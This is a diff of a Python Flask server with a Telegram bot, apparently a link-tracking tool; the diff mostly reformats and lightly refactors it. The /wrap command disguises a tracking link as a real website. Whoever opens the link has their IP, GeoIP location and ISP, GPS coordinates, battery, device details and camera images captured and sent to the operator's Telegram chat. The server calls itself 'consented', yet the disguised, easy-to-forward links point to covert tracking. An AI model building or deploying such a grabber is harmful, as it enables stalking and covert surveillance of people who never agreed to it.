@@ -6,7 +6,14 @@ import json
 import requests
 from datetime import datetime
 from dotenv import load_dotenv
-from flask import Flask, request, send_from_directory, render_template, jsonify, url_for
+from flask import (
+    Flask,
+    request,
+    send_from_directory,
+    render_template,
+    jsonify,
+    url_for,
+)
 from urllib.parse import urlparse
 
 # load .env in development
@@ -18,13 +25,14 @@ SESSIONS_FILE = "sessions.json"
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # required
 TELEGRAM_WEBHOOK_SECRET = os.environ.get(
     "TELEGRAM_WEBHOOK_SECRET",
-    "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8]
+    "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8],
 )
 
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
 # ---------- Flask app ----------
 app = Flask(__name__, template_folder="templates", static_folder="static")
+
 
 # ---------- Persistence helpers ----------
 def load_sessions():
@@ -34,6 +42,7 @@ def load_sessions():
     except Exception:
         return {}
 
+
 def save_sessions(sessions):
     try:
         with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
@@ -41,7 +50,9 @@ def save_sessions(sessions):
     except Exception as e:
         print("Failed to save sessions:", e)
 
+
 SESSIONS = load_sessions()
+
 
 # ---------- Telegram helpers ----------
 def telegram_api(method: str, data=None, files=None, timeout=30):
@@ -57,12 +68,14 @@ def telegram_api(method: str, data=None, files=None, timeout=30):
     except Exception as e:
         return None, str(e)
 
+
 def tg_send_text(chat_id: str, text: str):
     if not TELEGRAM_BOT_TOKEN or not chat_id:
         return False
     payload = {"chat_id": str(chat_id), "text": text}
     r, _ = telegram_api("sendMessage", data=payload)
     return bool(r and r.ok)
+
 
 def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
     if not TELEGRAM_BOT_TOKEN or not chat_id:
@@ -75,8 +88,10 @@ def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
                 data["caption"] = caption
             r, _ = telegram_api("sendPhoto", data=data, files=files)
             return bool(r and r.ok)
-    except Exception:
+    except Exception as e:
+        print("tg_send_photo error:", e)
         return False
+
 
 # ---------- Helpers ----------
 def is_valid_http_url(u: str):
@@ -85,6 +100,7 @@ def is_valid_http_url(u: str):
         return p.scheme in ("http", "https") and bool(p.netloc)
     except Exception:
         return False
+
 
 def normalize_url_for_wrap(text: str):
     if not text:
@@ -100,6 +116,7 @@ def normalize_url_for_wrap(text: str):
         return None
     return u
 
+
 def extract_client_ip(raw_ip: str):
     """
     X-Forwarded-For often looks like "client, proxy1, proxy2".
@@ -110,10 +127,15 @@ def extract_client_ip(raw_ip: str):
     parts = [p.strip() for p in raw_ip.split(",") if p.strip()]
     return parts[0] if parts else raw_ip
 
+
 # ---------- Basic endpoints ----------
 @app.route("/")
 def index():
-    return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)
+    return (
+        "Flask server for consented device session. Use the Telegram bot to create sessions.",
+        200,
+    )
+
 
 # Plain session creation (no embedded site)
 @app.route("/create", methods=["POST"])
@@ -126,7 +148,7 @@ def create_session():
         "label": label,
         "created_at": datetime.utcnow().isoformat(),
         "visits": [],
-        "chat_id": chat_id
+        "chat_id": chat_id,
     }
     save_sessions(SESSIONS)
     link = url_for("session_page", token=token, _external=True)
@@ -135,9 +157,10 @@ def create_session():
             chat_id,
             f"Plain session created\n"
             f"Token: {token}\n"
-            f"{link}"
+            f"{link}",
         )
     return jsonify({"token": token, "link": link})
+
 
 @app.route("/s/<token>")
 def session_page(token):
@@ -147,6 +170,7 @@ def session_page(token):
         return render_template("session.html", token=token)
     except Exception:
         return f"Session page for {token}", 200
+
 
 # Wrapped session creation (embed a target URL)
 @app.route("/wrap_create", methods=["POST"])
@@ -166,7 +190,7 @@ def wrap_create():
         "visits": [],
         "chat_id": chat_id,
         "target_url": target_url,
-        "wrap": True
+        "wrap": True,
     }
     save_sessions(SESSIONS)
     link = url_for("wrapper_page", token=token, _external=True)
@@ -174,6 +198,7 @@ def wrap_create():
         # reply with only ONE link (easy to forward)
         tg_send_text(chat_id, link)
     return jsonify({"token": token, "link": link})
+
 
 @app.route("/w/<token>")
 def wrapper_page(token):
@@ -184,7 +209,7 @@ def wrapper_page(token):
         return render_template("wrapper.html", token=token, target_url=target)
     except Exception:
         return f"Wrapper page for {token} -> {target}", 200
-    
+
 
 # ---------- upload_info with GeoIP and extra details ----------
 @app.route("/upload_info/<token>", methods=["POST"])
@@ -196,6 +221,7 @@ def upload_info(token):
     battery = payload.get("battery")
     coords = payload.get("coords")
     details = payload.get("details")  # full extra data bundle from JS
+    note = payload.get("note")
 
     raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ip = extract_client_ip(raw_ip)
@@ -204,9 +230,12 @@ def upload_info(token):
     # GeoIP enrichment (basic, external API)
     geo = None
     try:
-        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2)
-        if resp.ok:
-            geo = resp.json()
+        if ip not in ("unknown", None, ""):
+            resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2)
+            if resp.ok:
+                geo = resp.json()
+            else:
+                print("GeoIP non-ok:", resp.status_code, resp.text[:200])
     except Exception as e:
         print("GeoIP lookup failed:", e)
 
@@ -217,150 +246,158 @@ def upload_info(token):
         "coords": coords,
         "details": details,
         "geo": geo,
+        "note": note,
     }
 
-    SESSIONS[token]["visits"].append(entry)
+    SESSIONS[token].setdefault("visits", []).append(entry)
     save_sessions(SESSIONS)
 
-    # -------- Telegram notification formatting --------
     chat_id = SESSIONS[token].get("chat_id")
-    if chat_id:
-        # Battery
-        if isinstance(battery, dict):
-            lvl = battery.get("level")
-            chg = battery.get("charging")
-            try:
-                if lvl is not None:
-                    lvl = round(float(lvl))
-                    bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
-                else:
-                    bat_txt = "unknown"
-            except Exception:
-                bat_txt = str(battery)
-        else:
-            bat_txt = "unknown"
 
-        # Coords
-        if isinstance(coords, dict):
-            lat = coords.get("lat")
-            lon = coords.get("lon")
-            acc = coords.get("acc") or coords.get("accuracy")
-            if lat is not None and lon is not None:
-                if acc is not None:
-                    loc_txt = f"{lat},{lon} (±{acc} m)"
-                else:
-                    loc_txt = f"{lat},{lon}"
-            else:
-                loc_txt = str(coords)
-        else:
-            loc_txt = "unknown"
+    # If this is just a page-closed beacon (no real data), don't spam Telegram.
+    if not chat_id:
+        return jsonify({"status": "ok", "stored": entry})
+    if battery is None and coords is None and details is None:
+        return jsonify({"status": "ok", "stored": entry})
 
-        # GeoIP
-        city = region = country = isp = "unknown"
-        if isinstance(geo, dict):
-            city = geo.get("city") or "unknown"
-            region = geo.get("region") or geo.get("region_code") or "unknown"
-            country = geo.get("country_name") or geo.get("country") or "unknown"
-            isp = geo.get("org") or geo.get("asn") or "unknown"
-
-        # Extra device details from JS
-        d = details or {}
-        ua = d.get("userAgent", "") or ""
-        platform = d.get("platform") or ""
-        cpu = d.get("cpuCores")
-        ram = d.get("ramGB")
-        langs = d.get("languages")
-        scr = d.get("screen") or {}
-        net = d.get("network") or {}
-        perms = d.get("permissions") or {}
-        tz = d.get("tz") or {}
-
-        ua_short = ua[:80] + ("…" if len(ua) > 80 else "")
-        os_browser = platform
-        if ua_short:
-            os_browser = f"{platform} | {ua_short}" if platform else ua_short
-
-        scr_w = scr.get("w")
-        scr_h = scr.get("h")
-        scr_ratio = scr.get("ratio")
-
-        net_type = net.get("type") or "?"
-        net_dl = net.get("downlink")
+    # -------- Telegram notification formatting --------
+    # Battery
+    if isinstance(battery, dict):
+        lvl = battery.get("level")
+        chg = battery.get("charging")
         try:
-            if net_dl is not None:
-                net_dl = round(float(net_dl), 1)
+            if lvl is not None:
+                lvl = round(float(lvl))
+                bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
+            else:
+                bat_txt = "unknown"
+        except Exception:
+            bat_txt = str(battery)
+    else:
+        bat_txt = "unknown"
+
+    # Coords
+    if isinstance(coords, dict):
+        lat = coords.get("lat")
+        lon = coords.get("lon")
+        acc = coords.get("acc") or coords.get("accuracy")
+        if lat is not None and lon is not None:
+            if acc is not None:
+                loc_txt = f"{lat},{lon} (±{acc} m)"
+            else:
+                loc_txt = f"{lat},{lon}"
+        else:
+            loc_txt = str(coords)
+    else:
+        loc_txt = "unknown"
+
+    # GeoIP
+    city = region = country = isp = "unknown"
+    if isinstance(geo, dict):
+        city = geo.get("city") or "unknown"
+        region = geo.get("region") or geo.get("region_code") or "unknown"
+        country = geo.get("country_name") or geo.get("country") or "unknown"
+        isp = geo.get("org") or geo.get("asn") or "unknown"
+
+    # Extra device details from JS
+    d = details or {}
+    ua = d.get("userAgent", "") or ""
+    platform = d.get("platform") or ""
+    cpu = d.get("cpuCores")
+    ram = d.get("ramGB")
+    langs = d.get("languages")
+    scr = d.get("screen") or {}
+    net = d.get("network") or {}
+    perms = d.get("permissions") or {}
+    tz = d.get("tz") or {}
+
+    ua_short = ua[:80] + ("…" if len(ua) > 80 else "")
+    os_browser = platform
+    if ua_short:
+        os_browser = f"{platform} | {ua_short}" if platform else ua_short
+
+    scr_w = scr.get("w")
+    scr_h = scr.get("h")
+    scr_ratio = scr.get("ratio")
+
+    net_type = net.get("type") or "?"
+    net_dl = net.get("downlink")
+    try:
+        if net_dl is not None:
+            net_dl = round(float(net_dl), 1)
+    except Exception:
+        pass
+
+    cam_perm = perms.get("camera")
+    geo_perm = perms.get("geolocation")
+
+    tz_name = tz.get("zone") if isinstance(tz, dict) else None
+    tz_off = tz.get("offset") if isinstance(tz, dict) else None
+
+    lines = [
+        f"📡 Session {token} — INFO",
+        f"⏱ Time: {timestamp}",
+        f"🌍 IP: {ip}",
+        f"🏙 GeoIP: {city}, {region}, {country}",
+        f"🏢 ISP: {isp}",
+        "",
+        f"🔋 Battery: {bat_txt}",
+        f"📍 GPS: {loc_txt}",
+    ]
+
+    device_line = f"📱 Device: {os_browser}" if os_browser else "📱 Device: unknown"
+    lines.append(device_line)
+
+    extra_hw = []
+    if ram is not None:
+        extra_hw.append(f"RAM {ram} GB")
+    if cpu is not None:
+        extra_hw.append(f"CPU {cpu} cores")
+    if extra_hw:
+        lines.append("💾 " + " · ".join(extra_hw))
+
+    if langs:
+        try:
+            langs_txt = ", ".join(langs[:3])
+            lines.append(f"🌐 Lang: {langs_txt}")
         except Exception:
             pass
 
-        cam_perm = perms.get("camera")
-        geo_perm = perms.get("geolocation")
+    if scr_w and scr_h:
+        scr_part = f"{scr_w}×{scr_h}"
+        if scr_ratio:
+            scr_part += f" ({scr_ratio}x)"
+        lines.append(f"🖥 Screen: {scr_part}")
 
-        tz_name = tz.get("zone") if isinstance(tz, dict) else None
-        tz_off = tz.get("offset") if isinstance(tz, dict) else None
+    net_parts = []
+    if net_type and net_type != "?":
+        net_parts.append(net_type.upper())
+    if net_dl is not None:
+        net_parts.append(f"{net_dl} Mbps")
+    if net_parts:
+        lines.append("📶 Network: " + " ".join(net_parts))
 
-        lines = [
-            f"📡 Session {token} — INFO",
-            f"⏱ Time: {timestamp}",
-            f"🌍 IP: {ip}",
-            f"🏙 GeoIP: {city}, {region}, {country}",
-            f"🏢 ISP: {isp}",
-            "",
-            f"🔋 Battery: {bat_txt}",
-            f"📍 GPS: {loc_txt}",
-        ]
+    if tz_name or tz_off is not None:
+        tz_line = "🕒 Timezone: "
+        if tz_name:
+            tz_line += tz_name
+        if tz_off is not None:
+            tz_line += f" (offset {tz_off} min)"
+        lines.append(tz_line)
 
-        device_line = f"📱 Device: {os_browser}" if os_browser else "📱 Device: unknown"
-        lines.append(device_line)
+    perm_bits = []
+    if cam_perm:
+        perm_bits.append(f"camera={cam_perm}")
+    if geo_perm:
+        perm_bits.append(f"geolocation={geo_perm}")
+    if perm_bits:
+        lines.append("✅ Permissions: " + ", ".join(perm_bits))
 
-        extra_hw = []
-        if ram is not None:
-            extra_hw.append(f"RAM {ram} GB")
-        if cpu is not None:
-            extra_hw.append(f"CPU {cpu} cores")
-        if extra_hw:
-            lines.append("💾 " + " · ".join(extra_hw))
-
-        if langs:
-            try:
-                langs_txt = ", ".join(langs[:3])
-                lines.append(f"🌐 Lang: {langs_txt}")
-            except Exception:
-                pass
-
-        if scr_w and scr_h:
-            scr_part = f"{scr_w}×{scr_h}"
-            if scr_ratio:
-                scr_part += f" ({scr_ratio}x)"
-            lines.append(f"🖥 Screen: {scr_part}")
-
-        net_parts = []
-        if net_type and net_type != "?":
-            net_parts.append(net_type.upper())
-        if net_dl is not None:
-            net_parts.append(f"{net_dl} Mbps")
-        if net_parts:
-            lines.append("📶 Network: " + " ".join(net_parts))
-
-        if tz_name or tz_off is not None:
-            tz_line = "🕒 Timezone: "
-            if tz_name:
-                tz_line += tz_name
-            if tz_off is not None:
-                tz_line += f" (offset {tz_off} min)"
-            lines.append(tz_line)
-
-        perm_bits = []
-        if cam_perm:
-            perm_bits.append(f"camera={cam_perm}")
-        if geo_perm:
-            perm_bits.append(f"geolocation={geo_perm}")
-        if perm_bits:
-            lines.append("✅ Permissions: " + ", ".join(perm_bits))
-
-        msg = "\n".join(lines)
-        tg_send_text(chat_id, msg)
+    msg = "\n".join(lines)
+    tg_send_text(chat_id, msg)
 
     return jsonify({"status": "ok", "stored": entry})
+
 
 # ---------- upload_image ----------
 @app.route("/upload_image/<token>", methods=["POST"])
@@ -460,10 +497,11 @@ def upload_image(token):
             try:
                 downloads_url = url_for("serve_upload", filename=fname, _external=True)
                 tg_send_text(chat_id, f"Image saved: {downloads_url}\n{caption}")
-            except Exception:
-                pass
+            except Exception as e:
+                print("Fallback photo send error:", e)
 
     return jsonify({"status": "saved", "filename": fname, "meta": meta})
+
 
 @app.route("/session_data/<token>")
 def session_data(token):
@@ -471,9 +509,11 @@ def session_data(token):
         return "Invalid token", 404
     return jsonify(SESSIONS[token])
 
+
 @app.route("/uploads/<filename>")
 def serve_upload(filename):
     return send_from_directory(UPLOAD_DIR, filename)
+
 
 # ---------- Telegram webhook ----------
 @app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
@@ -502,7 +542,7 @@ def telegram_webhook():
                 "Commands:\n"
                 "/create [label]  – create plain session\n"
                 "/wrap <url>      – create embedded tracking link for a site\n"
-                "/status <token>  – show session summary"
+                "/status <token>  – show session summary",
             )
             return "ok", 200
 
@@ -514,13 +554,15 @@ def telegram_webhook():
                 r = requests.post(
                     url_for("create_session", _external=True),
                     json={"label": label, "chat_id": str(chat_id)},
-                    timeout=5
+                    timeout=5,
                 )
                 if r.ok:
                     data = r.json()
                     tg_send_text(chat_id, data["link"])
                 else:
-                    tg_send_text(chat_id, f"Failed to create session: {r.status_code}")
+                    tg_send_text(
+                        chat_id, f"Failed to create session: {r.status_code}"
+                    )
             except Exception as e:
                 print("create command error:", e)
                 tg_send_text(chat_id, "Server error while creating session.")
@@ -530,24 +572,33 @@ def telegram_webhook():
         if text.lower().startswith("/wrap"):
             parts = text.split(maxsplit=1)
             if len(parts) < 2:
-                tg_send_text(chat_id, "Usage: /wrap <url>\nExample: /wrap https://unstop.com")
+                tg_send_text(
+                    chat_id,
+                    "Usage: /wrap <url>\nExample: /wrap https://unstop.com",
+                )
                 return "ok", 200
             raw = parts[1].strip()
             url = normalize_url_for_wrap(raw)
             if not url:
-                tg_send_text(chat_id, "Invalid URL. Include domain, e.g. https://example.com")
+                tg_send_text(
+                    chat_id,
+                    "Invalid URL. Include domain, e.g. https://example.com",
+                )
                 return "ok", 200
             try:
                 r = requests.post(
                     url_for("wrap_create", _external=True),
                     json={"target_url": url, "label": "", "chat_id": str(chat_id)},
-                    timeout=5
+                    timeout=5,
                 )
                 if r.ok:
                     data = r.json()
                     tg_send_text(chat_id, data["link"])
                 else:
-                    tg_send_text(chat_id, f"Failed to create wrapped session: {r.status_code}")
+                    tg_send_text(
+                        chat_id,
+                        f"Failed to create wrapped session: {r.status_code}",
+                    )
             except Exception as e:
                 print("wrap command error:", e)
                 tg_send_text(chat_id, "Server error while creating wrapped session.")
@@ -561,9 +612,13 @@ def telegram_webhook():
                 return "ok", 200
             token = parts[1].strip()
             try:
-                r = requests.get(url_for("session_data", token=token, _external=True), timeout=5)
+                r = requests.get(
+                    url_for("session_data", token=token, _external=True), timeout=5
+                )
                 if r.status_code != 200:
-                    tg_send_text(chat_id, f"Server returned {r.status_code}: {r.text}")
+                    tg_send_text(
+                        chat_id, f"Server returned {r.status_code}: {r.text}"
+                    )
                     return "ok", 200
                 data = r.json()
                 visits = data.get("visits", [])
@@ -624,7 +679,7 @@ def telegram_webhook():
             "Use:\n"
             "/create [label]\n"
             "/wrap <url>\n"
-            "/status <token>"
+            "/status <token>",
         )
         return "ok", 200
 
@@ -632,6 +687,7 @@ def telegram_webhook():
         print("Telegram webhook error:", e)
 
     return "ok", 200
+
 
 # ---------- Run ----------
 if __name__ == "__main__":
